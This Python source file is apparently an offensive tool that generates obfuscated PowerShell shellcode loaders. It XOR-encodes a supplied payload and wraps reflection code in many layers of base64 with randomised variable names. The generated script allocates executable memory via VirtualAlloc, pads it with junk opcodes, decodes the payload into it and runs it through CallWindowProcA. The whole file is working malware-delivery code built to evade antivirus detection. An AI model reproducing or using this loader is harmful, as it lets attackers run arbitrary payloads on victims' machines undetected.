import random

from base64 import b64encode

from obfuscator import (
    XOREncoder,
    RotateLeftEncoder,
    junkCode,
    junkOPCodes
)

from utils import randomStr

REFLECTION_TEMPLATE = r"""
function LookupFunc {
        $ModuleName = $args[0]
        $FunctionName = $args[1]

        $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
                Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
        $tmp=@()
        $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
        return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}
function GetDelegateType {
        [Type[]]$Func = [Type[]]$args[0]
        [Type]$DelType = [Type]$args[1]

        $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
        [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass'
, [System.MulticastDelegate])
        $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
        $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')

        return $type.CreateType()
}
"""

BASE64_TEMPLATE = r"""
function b64decode {
    param (
        [string]$b64,
        [int]$times
    )
    $decoded = $b64
    for ($i = 0; $i -lt $times; $i++) {
        $bytes = [Convert]::FromBase64String($decoded)
        $decoded = [System.Text.Encoding]::UTF8.GetString($bytes)
    }
    return $decoded
}
"""

class Builder():
    def __init__(self, filename, output):
        self.filename = filename
        self.output = output
        self.encoders = [XOREncoder]
        self.selected_encoder = random.choice(self.encoders)
        self.selected_encoder = self.selected_encoder()         # initialize encoder
        self.file = bytes()
        self.str_file = ""
        self.b64_times = 0

    def run(self):
            pass

    def get_decoder_string(self):
        return self.selected_encoder.get_decoder_string()

    def fromFile(self):
        with open(self.filename, "rb") as f:
            self.file = f.read()
            self.file = self.selected_encoder.encode(self.file)
            
    def bytesToStr(self, _bytes):
        b = bytes([x for x in _bytes])
        return ",".join(["0x{:02x}".format(x) for x in b])
    
    def tob64(self, string):
        if not self.b64_times:
            self.b64_times = random.randint(3, 13)
        
        b64 = string.encode()
        for _ in range(self.b64_times):
            b64 = b64encode(b64)
    
        return b64.decode()             # TODO: split into chunks?

class ShellcodeBuilder(Builder):
    def run(self):
        self.fromFile()
        self.str_file = self.bytesToStr(self.file)
        
        name_op_codes, junk_op_codes = junkOPCodes()
        
        shellcode = randomStr(5, 30)
        shellcode_len = randomStr(5, 30)
        shellcode_addr = randomStr(5, 30)
        total_sc_len = randomStr(5, 30)
        func_ptr = randomStr(5, 30)
        delegate_type = randomStr(5, 30)
        func = randomStr(5, 30)
        size_mem_per_region = random.randint(10000, 20000) * 4
        mem_possition = randomStr(5, 30)
        idx = randomStr(5, 30)
        key = randomStr(5, 30)
        
        reflection = self.tob64(REFLECTION_TEMPLATE) # TODO: obfuscate template

        ps1 = []
        #ps1.append(junkCode())
        ps1.append(BASE64_TEMPLATE)      # TODO: obfuscate template
        ps1.append(f"iex(b64decode {reflection} {self.b64_times})")
        #ps1.append(junkCode())
        ps1.append(f"${name_op_codes} = {junk_op_codes}")
        #ps1.append(junkCode())
        #ps1.append(junkCode())
        ps1.append(f"${shellcode} = [byte[]]@({self.str_file})")
        ps1.append(f"${shellcode_len} = ${shellcode}.Length")
        ps1.append(f"${total_sc_len} = {size_mem_per_region} + ${shellcode_len}")
        #ps1.append(junkCode())
        ps1.append(f"${func_ptr} = LookupFunc kernel32 VirtualAlloc")
        ps1.append(f"${delegate_type} = GetDelegateType @([IntPtr], [uint32], [uint32], [uint32]) ([IntPtr])")
        ps1.append(f"${func} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${func_ptr}, ${delegate_type})")
        ps1.append(f"${shellcode_addr} = ${func}.invoke([IntPtr]::Zero, ${total_sc_len}, 0x3000, 0x40)")       # TODO: change RWX to RW -> RX
        
        ps1.append(f"""
${mem_possition} = 0
${func_ptr} = LookupFunc msvcrt memset
${delegate_type} = GetDelegateType $([IntPtr], [uint32], [uint32])
${func} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${func_ptr}, ${delegate_type})
while(${mem_possition} -le {size_mem_per_region}/4){{
    ${idx} = (New-Object System.Random).Next(0, ${name_op_codes}.Length-1)
    ${func}.invoke(${shellcode_addr}.ToInt64()+${mem_possition}, ${name_op_codes}[${idx}][0], 1)
    ${mem_possition}+=1
    ${func}.invoke(${shellcode_addr}.ToInt64()+${mem_possition}, ${name_op_codes}[${idx}][1], 1)
    ${mem_possition}+=1
    ${func}.invoke(${shellcode_addr}.ToInt64()+${mem_possition}, ${name_op_codes}[${idx}][2], 1)
    ${mem_possition}+=1
    ${func}.invoke(${shellcode_addr}.ToInt64()+${mem_possition}, ${name_op_codes}[${idx}][3], 1)
    ${mem_possition}+=1
}}
""")

        ps1.append(f"""
${key} = {self.selected_encoder.key_formated}
for ($i = 0; $i -le ${shellcode_len};$i++){{
    ${func}.invoke(${mem_possition}+$i+${shellcode_addr}.ToInt64(), ${shellcode}[$i] -bxor ${key}[$i % ${key}.Length],1)
}}
""")
        
        #ps1.append(f"[System.Runtime.InteropServices.Marshal]::Copy(${shellcode}, 0, ${shellcode_addr}, ${shellcode}.Length)")
        ps1.append(f"${func_ptr} = LookupFunc user32 CallWindowProcA")
        ps1.append(f"${delegate_type} = GetDelegateType @([intPtr], [intPtr], [IntPtr], [intPtr], [intPtr]) ([IntPtr])")
        ps1.append(f"${func} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${func_ptr}, ${delegate_type})")
        ps1.append(f"${func}.invoke(${shellcode_addr}, 0, 0, 0, 0)")

        # [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegateType)
        # $CallWindowProcA.Invoke($__Alloc_Addr,$__Alloc_Addr2,$__ntdll_NtProtectVirtualMemory_addr,0,0)
        # $__Alloc_Addr2 = LRESULT CALLBACK MyNewWindowProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)

        print("\n".join(ps1))
        
        with open(self.output, "w") as f:
            f.write("\n".join(ps1))